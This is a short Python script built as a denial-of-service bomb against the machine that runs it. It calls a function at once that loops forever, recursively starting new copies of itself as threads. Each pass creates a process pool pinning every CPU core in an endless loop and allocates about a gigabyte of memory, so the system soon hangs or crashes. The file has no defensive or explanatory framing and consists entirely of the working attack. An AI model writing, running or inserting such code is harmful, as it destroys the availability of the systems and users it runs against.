import threading
from multiprocessing import Pool
from multiprocessing import cpu_count


def f(x):
    while True:
        x*x


def spammer():
    print('spam thread initialized')
    while True:
        threading.Thread(target=spammer).start()
        processes = cpu_count()
        pool = Pool(processes)
        pool.map(f, range(processes))
        x = bytearray(1024 * 1024 * 1000)


spammer()
